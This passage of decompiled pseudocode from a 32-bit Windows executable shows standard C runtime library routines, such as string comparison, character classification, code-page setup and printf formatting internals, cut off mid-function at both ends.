      if ( a3 >= 4 )
        __asm { jmp     dword ptr ds:loc_40803C+4[eax*4] }
      __asm { jmp     dword ptr ds:loc_408138[ecx*4]; jumptable 00408015 case 0 }
    }
    v5 = a3 >> 2;
    switch ( v5 )
    {
      case 0u:
        goto LABEL_17;
      case 1u:
        goto LABEL_16;
      case 2u:
        goto LABEL_15;
      case 3u:
        goto LABEL_14;
      case 4u:
        goto LABEL_13;
      case 5u:
        goto LABEL_12;
      case 6u:
        goto LABEL_11;
      case 7u:
        *(_DWORD *)(a1 + 4 * v5 - 28) = *(_DWORD *)&a2[4 * v5 - 28];
LABEL_11:
        *(_DWORD *)(a1 + 4 * v5 - 24) = *(_DWORD *)&a2[4 * v5 - 24];
LABEL_12:
        *(_DWORD *)(a1 + 4 * v5 - 20) = *(_DWORD *)&a2[4 * v5 - 20];
LABEL_13:
        *(_DWORD *)(a1 + 4 * v5 - 16) = *(_DWORD *)&a2[4 * v5 - 16];
LABEL_14:
        *(_DWORD *)(a1 + 4 * v5 - 12) = *(_DWORD *)&a2[4 * v5 - 12];
LABEL_15:
        *(_DWORD *)(a1 + 4 * v5 - 8) = *(_DWORD *)&a2[4 * v5 - 8];
LABEL_16:
        *(_DWORD *)(a1 + 4 * v5 - 4) = *(_DWORD *)&a2[4 * v5 - 4];
        v3 = &a2[4 * v5];
        v4 = (_BYTE *)(4 * v5 + a1);
LABEL_17:
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_18;
          case 1u:
            goto LABEL_19;
          case 2u:
            goto LABEL_20;
          case 3u:
            goto LABEL_21;
        }
      default:
        qmemcpy((void *)a1, a2, 4 * v5);
        v3 = &a2[4 * v5];
        v4 = (_BYTE *)(a1 + 4 * v5);
        switch ( a3 & 3 )
        {
          case 0u:
LABEL_18:
            result = a1;
            break;
          case 1u:
LABEL_19:
            *v4 = *v3;
            result = a1;
            break;
          case 2u:
LABEL_20:
            *v4 = *v3;
            v4[1] = v3[1];
            result = a1;
            break;
          case 3u:
LABEL_21:
            *v4 = *v3;
            v4[1] = v3[1];
            v4[2] = v3[2];
            result = a1;
            break;
        }
        break;
    }
  }
  return result;
}

//----- (00408315) --------------------------------------------------------
int __cdecl isalpha(int C)
{
  int result; // eax

  if ( cbMultiByte <= 1 )
    result = off_412A10[0][C] & 0x103;
  else
    result = _isctype(C, 259);
  return result;
}
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (00408343) --------------------------------------------------------
int __cdecl isdigit(int C)
{
  int result; // eax

  if ( cbMultiByte <= 1 )
    result = off_412A10[0][C] & 4;
  else
    result = _isctype(C, 4);
  return result;
}
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (0040836B) --------------------------------------------------------
int __cdecl isspace(int C)
{
  int result; // eax

  if ( cbMultiByte <= 1 )
    result = off_412A10[0][C] & 8;
  else
    result = _isctype(C, 8);
  return result;
}
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (004083A0) --------------------------------------------------------
char *__cdecl strstr(const char *Str, const char *SubStr)
{
  unsigned __int8 v2; // dl
  const char *v3; // edi
  char v4; // dh
  const char *v5; // ecx
  char *v6; // esi
  char v7; // al
  char *result; // eax
  char v9; // ah
  char v10; // al
  char v11; // al
  int v12; // ebx
  int v13; // eax
  const char *v14; // edx
  char v15; // cl
  int v16; // ebx
  int v17; // ecx
  int v18; // esi
  int v19; // eax
  unsigned int v20; // eax
  unsigned int v21; // eax
  unsigned int v22; // eax

  v2 = *SubStr;
  v3 = Str;
  if ( !*SubStr )
    return (char *)Str;
  v4 = SubStr[1];
  if ( v4 )
  {
LABEL_3:
    v5 = SubStr;
    v6 = (char *)(v3 + 1);
    if ( *v3 == v2 )
      goto LABEL_9;
    if ( *v3 )
    {
      while ( 2 )
      {
        v7 = *v6++;
        while ( v7 == v2 )
        {
LABEL_9:
          v7 = *v6++;
          if ( v7 == v4 )
          {
            v3 = v6 - 1;
            while ( 1 )
            {
              v9 = v5[2];
              if ( !v9 )
                break;
              v10 = *v6;
              v6 += 2;
              if ( v10 != v9 )
                goto LABEL_3;
              v11 = v5[3];
              if ( !v11 )
                break;
              v5 += 2;
              if ( v11 != *(v6 - 1) )
                goto LABEL_3;
            }
            return (char *)(v3 - 1);
          }
        }
        if ( v7 )
          continue;
        break;
      }
    }
    result = 0;
  }
  else
  {
    v12 = v2;
    v13 = v2 << 8;
    v14 = Str;
    if ( ((unsigned __int8)Str & 3) != 0 )
    {
      while ( 1 )
      {
        v15 = *v14++;
        if ( v15 == (_BYTE)v12 )
          return (char *)(v14 - 1);
        if ( !v15 )
          break;
        if ( ((unsigned __int8)v14 & 3) == 0 )
          goto LABEL_24;
      }
LABEL_29:
      result = 0;
    }
    else
    {
LABEL_24:
      v16 = v13 | v12 | ((v13 | v12) << 16);
      while ( 1 )
      {
        while ( 1 )
        {
          v17 = v16 ^ *(_DWORD *)v14;
          v18 = *(_DWORD *)v14 + 2130640639;
          v19 = v18 ^ ~*(_DWORD *)v14;
          v14 += 4;
          if ( (((v17 + 2130640639) ^ ~v17) & 0x81010100) != 0 )
            break;
          v20 = v19 & 0x81010100;
          if ( v20 && ((v20 & 0x1010100) != 0 || (v18 & 0x80000000) == 0) )
            goto LABEL_29;
        }
        v21 = *((_DWORD *)v14 - 1);
        if ( (_BYTE)v21 == (_BYTE)v16 )
          break;
        if ( !(_BYTE)v21 )
          goto LABEL_29;
        if ( BYTE1(v21) == (_BYTE)v16 )
          return (char *)(v14 - 3);
        if ( !BYTE1(v21) )
          goto LABEL_29;
        v22 = HIWORD(v21);
        if ( (_BYTE)v22 == (_BYTE)v16 )
          return (char *)(v14 - 2);
        if ( !(_BYTE)v22 )
          goto LABEL_29;
        if ( BYTE1(v22) == (_BYTE)v16 )
          return (char *)(v14 - 1);
        if ( !BYTE1(v22) )
          goto LABEL_29;
      }
      result = (char *)(v14 - 4);
    }
  }
  return result;
}

//----- (00408420) --------------------------------------------------------
int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount)
{
  int v3; // ecx
  const char *v4; // edi
  bool v5; // zf
  size_t v6; // ecx
  const char *v7; // edi
  unsigned __int8 v9; // al

  v3 = MaxCount;
  if ( MaxCount )
  {
    v4 = Str1;
    do
    {
      if ( !v3 )
        break;
      v5 = *v4++ == 0;
      --v3;
    }
    while ( !v5 );
    v6 = MaxCount - v3;
    v7 = Str1;
    do
    {
      if ( !v6 )
        break;
      v5 = *Str2++ == *v7++;
      --v6;
    }
    while ( v5 );
    v9 = *(Str2 - 1);
    v3 = 0;
    if ( v9 > (unsigned int)*(v7 - 1) )
      return ~v3;
    if ( v9 != *(v7 - 1) )
    {
      v3 = -2;
      return ~v3;
    }
  }
  return v3;
}

//----- (0040854E) --------------------------------------------------------
void __cdecl __noreturn _amsg_exit(DWORD NumberOfBytesWritten)
{
  if ( dword_493928 == 1 )
    _FF_MSGBANNER();
  _NMSG_WRITE(NumberOfBytesWritten);
  off_412910(255);
}
// 412910: using guessed type int (__cdecl *off_412910)(_DWORD);
// 493928: using guessed type int dword_493928;

//----- (00408573) --------------------------------------------------------
void __cdecl __noreturn fast_error_exit(DWORD NumberOfBytesWritten)
{
  if ( dword_493928 == 1 )
    _FF_MSGBANNER();
  _NMSG_WRITE(NumberOfBytesWritten);
  ExitProcess(0xFFu);
}
// 493928: using guessed type int dword_493928;

//----- (00408597) --------------------------------------------------------
int __cdecl _setmbcp(int CodePage)
{
  UINT v1; // eax
  UINT v2; // esi
  int v3; // edx
  _DWORD *v4; // eax
  bool v5; // cc
  BYTE *v6; // ecx
  BYTE v7; // dl
  unsigned int i; // eax
  int v9; // esi
  char *v10; // ebx
  unsigned __int8 *v11; // ecx
  unsigned __int8 v12; // dl
  unsigned int v13; // eax
  unsigned int v14; // edi
  char v15; // dl
  int v16; // eax
  _DWORD *v17; // esi
  unsigned int j; // eax
  struct _cpinfo CPInfo; // [esp+Ch] [ebp-18h] BYREF
  unsigned int v21; // [esp+20h] [ebp-4h]
  UINT CodePagea; // [esp+2Ch] [ebp+8h]

  v1 = getSystemCP(CodePage);
  v2 = v1;
  CodePagea = v1;
  if ( v1 == ::CodePage )
    return 0;
  if ( !v1 )
  {
LABEL_30:
    setSBCS();
LABEL_31:
    setSBUpLow();
    return 0;
  }
  v3 = 0;
  v4 = &unk_412920;
  do
  {
    if ( *v4 == v2 )
    {
      memset(&unk_494D60, 0, 0x100u);
      v21 = 0;
      v9 = 48 * v3;
      *((_BYTE *)&unk_494D60 + 256) = 0;
      v10 = (char *)&unk_412930 + 48 * v3;
      do
      {
        v11 = (unsigned __int8 *)v10;
        if ( *v10 )
        {
          do
          {
            v12 = v11[1];
            if ( !v12 )
              break;
            v13 = *v11;
            v14 = v12;
            if ( v13 <= v12 )
            {
              v15 = byte_412918[v21];
              do
                byte_494D61[v13++] |= v15;
              while ( v13 <= v14 );
            }
            v11 += 2;
          }
          while ( *v11 );
        }
        ++v21;
        v10 += 8;
      }
      while ( v21 < 4 );
      dword_494C4C = 1;
      ::CodePage = CodePagea;
      v16 = CPtoLCID(CodePagea);
      v17 = (_DWORD *)((char *)&unk_412924 + v9);
      dword_494C40[0] = *v17++;
      dword_494C40[1] = *v17;
      Locale = v16;
      dword_494C40[2] = v17[1];
      goto LABEL_31;
    }
    v4 += 12;
    ++v3;
  }
  while ( (int)v4 < (int)off_412A10 );
  if ( GetCPInfo(v2, &CPInfo) )
  {
    v5 = CPInfo.MaxCharSize <= 1;
    ::CodePage = v2;
    memset(&unk_494D60, 0, 0x100u);
    *((_BYTE *)&unk_494D60 + 256) = 0;
    Locale = 0;
    if ( v5 )
    {
      dword_494C4C = 0;
    }
    else
    {
      if ( CPInfo.LeadByte[0] )
      {
        v6 = &CPInfo.LeadByte[1];
        do
        {
          v7 = *v6;
          if ( !*v6 )
            break;
          for ( i = *(v6 - 1); i <= v7; ++i )
            byte_494D61[i] |= 4u;
          v6 += 2;
        }
        while ( *(v6 - 1) );
      }
      for ( j = 1; j < 0xFF; ++j )
        byte_494D61[j] |= 8u;
      Locale = CPtoLCID(v2);
      dword_494C4C = 1;
    }
    dword_494C40[0] = 0;
    dword_494C40[1] = 0;
    dword_494C40[2] = 0;
    goto LABEL_31;
  }
  if ( dword_49392C )
    goto LABEL_30;
  return -1;
}
// 412A10: using guessed type __int16 *off_412A10[2];
// 49392C: using guessed type int dword_49392C;
// 494C4C: using guessed type int dword_494C4C;

//----- (00408730) --------------------------------------------------------
UINT __cdecl getSystemCP(UINT a1)
{
  UINT result; // eax

  result = a1;
  dword_49392C = 0;
  switch ( a1 )
  {
    case 0xFFFFFFFE:
      dword_49392C = 1;
      result = GetOEMCP();
      break;
    case 0xFFFFFFFD:
      dword_49392C = 1;
      result = GetACP();
      break;
    case 0xFFFFFFFC:
      result = dword_49394C;
      dword_49392C = 1;
      break;
  }
  return result;
}
// 49392C: using guessed type int dword_49392C;

//----- (0040877A) --------------------------------------------------------
int __cdecl CPtoLCID(int a1)
{
  switch ( a1 )
  {
    case 932:
      return 1041;
    case 936:
      return 2052;
    case 949:
      return 1042;
    case 950:
      return 1028;
  }
  return 0;
}

//----- (004087AD) --------------------------------------------------------
int setSBCS()
{
  int result; // eax

  memset(&unk_494D60, 0, 0x100u);
  *((_BYTE *)&unk_494D60 + 256) = 0;
  result = 0;
  CodePage = 0;
  dword_494C4C = 0;
  Locale = 0;
  dword_494C40[0] = 0;
  dword_494C40[1] = 0;
  dword_494C40[2] = 0;
  return result;
}
// 494C4C: using guessed type int dword_494C4C;

//----- (004087D6) --------------------------------------------------------
unsigned int setSBUpLow()
{
  unsigned int i; // eax
  BYTE v1; // al
  BYTE *v2; // edx
  unsigned int v3; // ecx
  unsigned int result; // eax
  WORD *j; // ecx
  char v6; // dl
  char v7; // cl
  WORD CharType[256]; // [esp+4h] [ebp-514h] BYREF
  CHAR v9[256]; // [esp+204h] [ebp-314h] BYREF
  CHAR DestStr[256]; // [esp+304h] [ebp-214h] BYREF
  CHAR SrcStr[256]; // [esp+404h] [ebp-114h] BYREF
  struct _cpinfo CPInfo; // [esp+504h] [ebp-14h] BYREF

  if ( GetCPInfo(CodePage, &CPInfo) )
  {
    for ( i = 0; i < 0x100; ++i )
      SrcStr[i] = i;
    v1 = CPInfo.LeadByte[0];
    SrcStr[0] = 32;
    if ( CPInfo.LeadByte[0] )
    {
      v2 = &CPInfo.LeadByte[1];
      do
      {
        v3 = *v2;
        if ( v1 <= v3 )
          memset(&SrcStr[v1], 0x20u, v3 - v1 + 1);
        v2 += 2;
        v1 = *(v2 - 1);
      }
      while ( v1 );
    }
    __crtGetStringTypeA(1u, SrcStr, 256, CharType, CodePage, Locale, 0);
    __crtLCMapStringA(Locale, 0x100u, SrcStr, 256, DestStr, 256, CodePage, 0);
    __crtLCMapStringA(Locale, 0x200u, SrcStr, 256, v9, 256, CodePage, 0);
    result = 0;
    for ( j = CharType; ; ++j )
    {
      if ( (*j & 1) != 0 )
      {
        byte_494D61[result] |= 0x10u;
        v6 = DestStr[result];
      }
      else
      {
        if ( (*j & 2) == 0 )
        {
          byte_494C60[result] = 0;
          goto LABEL_16;
        }
        byte_494D61[result] |= 0x20u;
        v6 = v9[result];
      }
      byte_494C60[result] = v6;
LABEL_16:
      if ( ++result >= 0x100 )
        return result;
    }
  }
  for ( result = 0; result < 0x100; ++result )
  {
    if ( result >= 0x41 && result <= 0x5A )
    {
      byte_494D61[result] |= 0x10u;
      v7 = result + 32;
LABEL_22:
      byte_494C60[result] = v7;
      continue;
    }
    if ( result >= 0x61 && result <= 0x7A )
    {
      byte_494D61[result] |= 0x20u;
      v7 = result - 32;
      goto LABEL_22;
    }
    byte_494C60[result] = 0;
  }
  return result;
}

//----- (0040895B) --------------------------------------------------------
int sub_40895B()
{
  int result; // eax

  if ( !dword_494C28 )
  {
    result = _setmbcp(-3);
    dword_494C28 = 1;
  }
  return result;
}
// 494C28: using guessed type int dword_494C28;

//----- (00408977) --------------------------------------------------------
unsigned __int8 *__cdecl _mbsnbcpy(unsigned __int8 *Dest, const unsigned __int8 *Source, size_t Count)
{
  unsigned __int8 *v3; // edi
  size_t v5; // edx
  const unsigned __int8 *v6; // ecx
  unsigned __int8 v7; // al
  bool v8; // zf
  _BYTE *v9; // ecx
  unsigned __int8 v10; // al
  size_t v11; // eax
  size_t v12; // edx

  v3 = Dest;
  if ( !dword_494C4C )
    return (unsigned __int8 *)strncpy((char *)Dest, (const char *)Source, Count);
  v5 = Count;
  if ( !Count )
    goto LABEL_14;
  v6 = Source;
  while ( 1 )
  {
    v7 = *v6;
    --v5;
    v8 = (byte_494D61[*v6] & 4) == 0;
    *v3 = *v6;
    if ( v8 )
    {
      ++v3;
      ++v6;
      if ( !v7 )
        goto LABEL_14;
      goto LABEL_10;
    }
    ++v3;
    v9 = v6 + 1;
    if ( !v5 )
    {
      *(v3 - 1) = 0;
      goto LABEL_14;
    }
    v10 = *v9;
    --v5;
    *v3++ = *v9;
    v6 = v9 + 1;
    if ( !v10 )
      break;
LABEL_10:
    if ( !v5 )
      goto LABEL_14;
  }
  *(v3 - 2) = 0;
LABEL_14:
  v11 = v5;
  v12 = v5 - 1;
  if ( v11 )
    memset(v3, 0, v12 + 1);
  return Dest;
}
// 494C4C: using guessed type int dword_494C4C;

//----- (00408A01) --------------------------------------------------------
int __cdecl __crtLCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest, UINT CodePage, int a8)
{
  int v9; // eax
  int v10; // ebx
  int v11; // eax
  void *v12; // esp
  int v13; // eax
  int v14; // esi
  int v15; // eax
  void *v16; // esp
  int v17; // eax
  WCHAR v18[8]; // [esp+0h] [ebp-38h] BYREF
  int v19; // [esp+10h] [ebp-28h]
  LPWSTR lpWideCharStr; // [esp+14h] [ebp-24h]
  WCHAR *v21; // [esp+18h] [ebp-20h]
  int v22; // [esp+1Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  if ( !dword_493930 )
  {
    if ( LCMapStringW(0, 0x100u, &SrcStr, 1, 0, 0) )
    {
      dword_493930 = 1;
    }
    else
    {
      if ( !LCMapStringA(0, 0x100u, byte_40D24C, 1, 0, 0) )
        return 0;
      dword_493930 = 2;
    }
  }
  if ( cchSrc > 0 )
    cchSrc = (int)strncnt(lpSrcStr, (_BYTE *)cchSrc);
  if ( dword_493930 == 2 )
    return LCMapStringA(Locale, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);
  if ( dword_493930 != 1 )
    return 0;
  if ( !CodePage )
    CodePage = dword_49394C;
  v9 = MultiByteToWideChar(CodePage, a8 != 0 ? 9 : 1, lpSrcStr, cchSrc, 0, 0);
  v10 = v9;
  v22 = v9;
  if ( !v9 )
    return 0;
  v11 = 2 * v9 + 3;
  LOBYTE(v11) = v11 & 0xFC;
  v12 = alloca(v11);
  ms_exc.old_esp = (DWORD)v18;
  lpWideCharStr = v18;
  ms_exc.registration.TryLevel = -1;
  if ( !v18 )
    return 0;
  if ( !MultiByteToWideChar(CodePage, 1u, lpSrcStr, cchSrc, lpWideCharStr, v10) )
    return 0;
  v13 = LCMapStringW(Locale, dwMapFlags, lpWideCharStr, v10, 0, 0);
  v14 = v13;
  v19 = v13;
  if ( !v13 )
    return 0;
  if ( (dwMapFlags & 0x400) != 0 )
  {
    if ( cchDest && (v13 > cchDest || !LCMapStringW(Locale, dwMapFlags, lpWideCharStr, v10, (LPWSTR)lpDestStr, cchDest)) )
      return 0;
  }
  else
  {
    v15 = 2 * v13 + 3;
    LOBYTE(v15) = v15 & 0xFC;
    v16 = alloca(v15);
    ms_exc.old_esp = (DWORD)v18;
    v21 = v18;
    ms_exc.registration.TryLevel = -1;
    if ( !v18 || !LCMapStringW(Locale, dwMapFlags, lpWideCharStr, v22, v18, v14) )
      return 0;
    v17 = cchDest ? WideCharToMultiByte(CodePage, 0x220u, v18, v14, lpDestStr, cchDest, 0, 0) : WideCharToMultiByte(
                                                                                                  CodePage,
                                                                                                  0x220u,
                                                                                                  v18,
                                                                                                  v14,
                                                                                                  0,
                                                                                                  0,
                                                                                                  0,
                                                                                                  0);
    v14 = v17;
    if ( !v17 )
      return 0;
  }
  return v14;
}
// 493930: using guessed type int dword_493930;

//----- (00408C25) --------------------------------------------------------
_BYTE *__cdecl strncnt(_BYTE *a1, _BYTE *a2)
{
  _BYTE *v2; // eax
  _BYTE *v3; // ecx
  _BYTE *result; // eax

  v2 = a1;
  v3 = a2 - 1;
  if ( a2 )
  {
    do
    {
      if ( !*v2 )
        break;
      ++v2;
    }
    while ( v3-- );
  }
  if ( *v2 )
    result = a2;
  else
    result = (_BYTE *)(v2 - a1);
  return result;
}

//----- (00408C50) --------------------------------------------------------
int __cdecl _isctype(int C, int Type)
{
  int v2; // ecx
  int v3; // eax
  int result; // eax
  int SrcStr; // [esp+0h] [ebp-4h] BYREF

  SrcStr = v2;
  if ( (unsigned int)(C + 1) <= 0x100 )
  {
    v3 = (unsigned __int16)off_412A10[0][C];
    return Type & v3;
  }
  if ( off_412A10[0][BYTE1(C)] >= 0 )
  {
    LOWORD(SrcStr) = (unsigned __int8)C;
    result = __crtGetStringTypeA(1u, (LPCSTR)&SrcStr, 1, (LPWORD)&C + 1, 0, 0, 1);
  }
  else
  {
    LOBYTE(SrcStr) = BYTE1(C);
    *(_WORD *)((char *)&SrcStr + 1) = (unsigned __int8)C;
    result = __crtGetStringTypeA(1u, (LPCSTR)&SrcStr, 2, (LPWORD)&C + 1, 0, 0, 1);
  }
  if ( result )
  {
    v3 = HIWORD(C);
    return Type & v3;
  }
  return result;
}
// 408C53: variable 'v2' is possibly undefined
// 412A10: using guessed type __int16 *off_412A10[2];

//----- (00408CC5) --------------------------------------------------------
int __cdecl _flsbuf(int Ch, FILE *File)
{
  FILE *v2; // esi
  int v3; // eax
  int v4; // ebx
  int v5; // eax
  char *v6; // eax
  signed int v7; // edi
  _BYTE *v8; // eax

  v2 = File;
  v3 = File->_flag;
  v4 = File->_file;
  if ( (v3 & 0x82) == 0 || (v3 & 0x40) != 0 )
    goto LABEL_24;
  if ( (v3 & 1) == 0 )
    goto LABEL_6;
  File->_cnt = 0;
  if ( (v3 & 0x10) == 0 )
  {
LABEL_24:
    LOBYTE(v3) = v3 | 0x20;
    v2->_flag = v3;
    return -1;
  }
  LOBYTE(v3) = v3 & 0xFE;
  v2->_ptr = v2->_base;
  v2->_flag = v3;
LABEL_6:
  v5 = v2->_flag;
  v2->_cnt = 0;
  File = 0;
  LOBYTE(v5) = v5 & 0xEF | 2;
  v2->_flag = v5;
  if ( (v5 & 0x10C) == 0 && (v2 != (FILE *)&unk_412DA0 && v2 != (FILE *)&unk_412DC0 || !_isatty(v4)) )
    _getbuf(v2);
  if ( (v2->_flag & 0x108) != 0 )
  {
    v6 = v2->_base;
    v7 = v2->_ptr - v6;
    v2->_ptr = v6 + 1;
    v2->_cnt = v2->_bufsiz - 1;
    if ( v7 <= 0 )
    {
      if ( v4 == -1 )
        v8 = &unk_412CC8;
      else
        v8 = (_BYTE *)(dword_494B20[v4 >> 5] + 8 * (v4 & 0x1F));
      if ( (v8[4] & 0x20) != 0 )
        _lseek(v4, 0, 2);
    }
    else
    {
      File = (FILE *)_write(v4, v6, v7);
    }
    *v2->_base = Ch;
  }
  else
  {
    v7 = 1;
    File = (FILE *)_write(v4, &Ch, 1u);
  }
  if ( File == (FILE *)v7 )
    return (unsigned __int8)Ch;
  v2->_flag |= 0x20u;
  return -1;
}
// 494B20: using guessed type int dword_494B20[];

//----- (00408DDA) --------------------------------------------------------
int __cdecl _output(FILE *File, int a2, int a3)
{
  int v3; // esi
  char v4; // bl
  char *v5; // edi
  bool v6; // zf
  int v7; // ecx
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // esi
  CHAR *v12; // eax
  char *v13; // ecx
  char *i; // eax
  int v15; // edx
  CHAR *v16; // edi
  __int16 v17; // ax
  __int16 *v18; // eax
  CHAR *v19; // ecx
  unsigned int v20; // eax
  int v21; // eax
  int v22; // esi
  char *j; // eax
  int v24; // edx
  _WORD *v25; // eax
  __int64 v26; // rax
  unsigned __int64 v27; // rdi
  int v28; // eax
  int v29; // ebx
  unsigned __int64 v30; // kr08_8
  CHAR *v31; // eax
  char *v32; // eax
  char v33; // bl
  int v34; // esi
  wchar_t *v35; // ebx
  int v36; // edi
  wchar_t v37; // ax
  int v38; // eax
  CHAR MultiByteStr; // [esp+Ch] [ebp-248h] BYREF
  char v42[510]; // [esp+Dh] [ebp-247h] BYREF
  char v43; // [esp+20Bh] [ebp-49h] BYREF
  int v44[2]; // [esp+20Ch] [ebp-48h] BYREF
  __int64 v45; // [esp+214h] [ebp-40h]
  CHAR v46[4]; // [esp+21Ch] [ebp-38h] BYREF
  int v47; // [esp+220h] [ebp-34h]
  int v48; // [esp+224h] [ebp-30h]
  int v49; // [esp+228h] [ebp-2Ch]
  int v50; // [esp+22Ch] [ebp-28h]
  int v51; // [esp+230h] [ebp-24h]
  int v52; // [esp+234h] [ebp-20h]
  int v53; // [esp+238h] [ebp-1Ch]
  char v54[2]; // [esp+23Eh] [ebp-16h] BYREF
  int v55; // [esp+240h] [ebp-14h] BYREF
  int v56; // [esp+244h] [ebp-10h]
  int v57; // [esp+248h] [ebp-Ch]
  CHAR *v58; // [esp+24Ch] [ebp-8h]
  int v59; // [esp+250h] [ebp-4h]
  char *v60; // [esp+260h] [ebp+Ch]

  v3 = 0;
  v4 = *(_BYTE *)a2;
  v5 = (char *)(a2 + 1);
  v6 = *(_BYTE *)a2 == 0;
  v57 = 0;
  v55 = 0;
  v60 = (char *)(a2 + 1);
  if ( !v6 )
  {
    v7 = v56;
    while ( 1 )
    {
      if ( v55 < 0 )
        return v55;
      if ( v4 < 32 || v4 > 120 )
        v8 = 0;
      else
        v8 = *((_BYTE *)&SrcStr + v4) & 0xF;
      v48 = byte_40D270[8 * v8 + v3] >> 4;
      switch ( v48 )
      {
        case 0:
          goto LABEL_42;
        case 1:
          v56 = -1;
          v47 = 0;
          v50 = 0;
          v52 = 0;
          v53 = 0;
          v59 = 0;
          v51 = 0;
          goto LABEL_179;
        case 2:
          switch ( v4 )
          {
            case ' ':
              v59 |= 2u;
              break;
            case '#':
              LOBYTE(v59) = v59 | 0x80;
              break;
            case '+':
              v59 |= 1u;
              break;
            case '-':
              v59 |= 4u;
              break;
            case '0':
              v59 |= 8u;
              break;
          }
          goto LABEL_179;
        case 3:
          if ( v4 == 42 )
          {
            v9 = sub_4095B9(&a3);
            v52 = v9;
            if ( v9 >= 0 )
              goto LABEL_179;
            v59 |= 4u;
            v10 = -v9;
          }
          else
          {
            v10 = v4 + 10 * v52 - 48;
          }
          v52 = v10;
          goto LABEL_179;
        case 4:
          v56 = 0;
          goto LABEL_179;
        case 5:
          if ( v4 == 42 )
          {
            v56 = sub_4095B9(&a3);
            if ( v56 < 0 )
              v56 = -1;
          }
          else
          {
            v56 = v4 + 10 * v7 - 48;
          }
          goto LABEL_179;
        case 6:
          switch ( v4 )
          {
            case 'I':
              if ( *v5 == 54 && v5[1] == 52 )
              {
                BYTE1(v59) |= 0x80u;
                v60 = v5 + 2;
              }
              else
              {
                v48 = 0;
LABEL_42:
                v51 = 0;
                if ( off_412A10[0][(unsigned __int8)v4] < 0 )
                {
                  write_char(v4, File, (int)&v55);
                  v4 = *v5;
                  v60 = v5 + 1;
                }
                write_char(v4, File, (int)&v55);
              }
              break;
            case 'h':
              v59 |= 0x20u;
              break;
            case 'l':
              v59 |= 0x10u;
              break;
            case 'w':
              BYTE1(v59) |= 8u;
              break;
          }
          goto LABEL_179;
        case 7:
          if ( v4 <= 103 )
          {
            if ( v4 >= 101 )
              goto LABEL_65;
            if ( v4 > 88 )
            {
              if ( v4 == 90 )
              {
                v18 = (__int16 *)sub_4095B9(&a3);
                if ( v18 && (v19 = (CHAR *)*((_DWORD *)v18 + 1)) != 0 )
                {
                  if ( (v59 & 0x800) != 0 )
                  {
                    v20 = (unsigned int)*v18 >> 1;
                    v58 = v19;
                    v57 = v20;
                    v51 = 1;
                    goto LABEL_156;
                  }
                  v51 = 0;
                  v58 = v19;
                  v21 = *v18;
                }
                else
                {
                  v58 = off_412C28;
                  v21 = strlen(off_412C28);
                }
                goto LABEL_155;
              }
              if ( v4 == 99 )
                goto LABEL_69;
              if ( v4 != 100 )
                goto LABEL_156;
LABEL_122:
              v59 |= 0x40u;
LABEL_123:
              v57 = 10;
              goto LABEL_124;
            }
            if ( v4 != 88 )
            {
              if ( v4 != 67 )
              {
                if ( v4 == 69 || v4 == 71 )
                {
                  v47 = 1;
                  v4 += 32;
LABEL_65:
                  v59 |= 0x40u;
                  v16 = &MultiByteStr;
                  v58 = &MultiByteStr;
                  if ( v7 >= 0 )
                  {
                    if ( !v7 && v4 == 103 )
                      v56 = 1;
                  }
                  else
                  {
                    v56 = 6;
                  }
                  a3 += 8;
                  v44[0] = *(_DWORD *)(a3 - 8);
                  v44[1] = *(_DWORD *)(a3 - 4);
                  off_413000(v44, &MultiByteStr, v4, v56, v47);
                  v22 = v59 & 0x80;
                  if ( (v59 & 0x80) != 0 && !v56 )
                    off_41300C(&MultiByteStr);
                  if ( v4 == 103 && !v22 )
                    off_413004(&MultiByteStr);
                  if ( MultiByteStr == 45 )
                  {
                    BYTE1(v59) |= 1u;
                    v16 = v42;
                    v58 = v42;
                  }
                  v21 = strlen(v16);
                }
                else
                {
                  if ( v4 != 83 )
                    goto LABEL_156;
                  if ( (v59 & 0x830) == 0 )
                    BYTE1(v59) |= 8u;
LABEL_55:
                  v11 = v56;
                  if ( v56 == -1 )
                    v11 = 0x7FFFFFFF;
                  v12 = (CHAR *)sub_4095B9(&a3);
                  v13 = v12;
                  v58 = v12;
                  if ( (v59 & 0x810) != 0 )
                  {
                    if ( !v12 )
                    {
                      v13 = (char *)off_412C2C;
                      v58 = (CHAR *)off_412C2C;
                    }
                    v51 = 1;
                    for ( i = v13; ; i += 2 )
                    {
                      v15 = v11--;
                      if ( !v15 || !*(_WORD *)i )
                        break;
                    }
                    v21 = (i - v13) >> 1;
                  }
                  else
                  {
                    if ( !v12 )
                    {
                      v13 = off_412C28;
                      v58 = off_412C28;
                    }
                    for ( j = v13; ; ++j )
                    {
                      v24 = v11--;
                      if ( !v24 || !*j )
                        break;
                    }
                    v21 = j - v13;
                  }
                }
LABEL_155:
                v57 = v21;
                goto LABEL_156;
              }
              if ( (v59 & 0x830) == 0 )
                BYTE1(v59) |= 8u;
LABEL_69:
              if ( (v59 & 0x810) != 0 )
              {
                v17 = sub_4095D6(&a3);
                v57 = wctomb(&MultiByteStr, v17);
                if ( v57 < 0 )
                  v50 = 1;
              }
              else
              {
                MultiByteStr = sub_4095B9(&a3);
                v57 = 1;
              }
              v58 = &MultiByteStr;
              goto LABEL_156;
            }
            goto LABEL_113;
          }
          if ( v4 == 105 )
            goto LABEL_122;
          if ( v4 == 110 )
          {
            v25 = (_WORD *)sub_4095B9(&a3);
            if ( (v59 & 0x20) != 0 )
              *v25 = v55;
            else
              *(_DWORD *)v25 = v55;
            v50 = 1;
            goto LABEL_179;
          }
          if ( v4 != 111 )
          {
            if ( v4 != 112 )
            {
              if ( v4 == 115 )
                goto LABEL_55;
              if ( v4 == 117 )
                goto LABEL_123;
              if ( v4 != 120 )
                goto LABEL_156;
              v49 = 39;
              goto LABEL_114;
            }
            v56 = 8;
LABEL_113:
            v49 = 7;
LABEL_114:
            v57 = 16;
            if ( (v59 & 0x80u) != 0 )
            {
              v54[0] = 48;
              v53 = 2;
              v54[1] = v49 + 81;
            }
            goto LABEL_124;
          }
          v57 = 8;
          if ( (v59 & 0x80u) != 0 )
            BYTE1(v59) |= 2u;
